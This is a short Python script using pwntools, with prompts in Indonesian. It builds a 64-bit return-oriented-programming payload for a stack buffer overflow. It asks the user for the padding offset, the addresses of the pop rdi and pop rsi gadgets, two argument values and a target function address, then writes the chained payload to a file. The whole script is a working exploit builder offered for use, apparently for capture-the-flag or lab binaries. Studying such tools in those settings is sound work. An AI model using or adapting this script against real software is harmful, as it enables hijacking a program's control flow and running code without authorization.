from pwn import *
import os

def create_payload():
    if not os.path.exists("result"):
        os.makedirs("result")

    print("[*] Masukkan offset/padding yang dibutuhkan untuk mencapai return address")
    input_padding = int(input("[>] Masukan Offset: "))
    padding = b"A" * input_padding

    print("[*] Masukkan alamat gadget pop rdi")
    input_rdi = int(input("[>] Masukan alamat pop RDI (hex): "), 16)
    pop_rdi = p64(input_rdi)

    print("[*] Masukkan alamat gadget pop rsi")
    input_rsi = int(input("[>] Masukan alamat pop RSI (hex): "), 16)
    pop_rsi_r15 = p64(input_rsi)

    print("[*] Masukkan nilai parameter pertama")
    input_param1 = int(input("[>] Masukan Parameter 1 (hex): "), 16)
    param1 = p64(input_param1)

    print("[*] Masukkan nilai parameter kedua")
    input_param2 = int(input("[>] Masukan Parameter 2 (hex): "), 16)
    param2 = p64(input_param2)

    junk = p64(0x0)

    print("[*] Masukkan alamat fungsi target")
    input_hacker_addr = int(input("[>] Masukan Alamat Target (hex): "), 16)
    hacked_addr = p64(input_hacker_addr)

    print("[+] Membuat payload...")
    payload = padding + pop_rdi + param1 + pop_rsi_r15 + param2 + junk + hacked_addr

    print("[+] Menyimpan payload ke file 'result/payload_64x'")
    with open("result/payload_64x", "wb") as f:
        f.write(payload)
    print("[+] Payload berhasil dibuat!")